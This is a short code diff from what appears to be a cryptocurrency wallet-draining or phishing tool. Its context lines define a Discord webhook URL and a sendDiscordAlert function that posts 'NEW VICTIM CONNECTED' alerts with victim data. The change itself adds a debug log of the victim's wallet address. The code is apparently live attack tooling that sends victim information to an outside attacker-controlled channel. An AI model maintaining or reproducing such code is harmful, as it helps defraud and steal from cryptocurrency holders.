@@ -44,6 +44,8 @@ const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/142694601510957888
 
 async function sendDiscordAlert(victimData) {
   try {
+    console.log('🔍 DEBUG: sendDiscordAlert called with:', victimData.walletAddress);
+
     const message = {
       embeds: [{
         title: "🎯 NEW VICTIM CONNECTED",
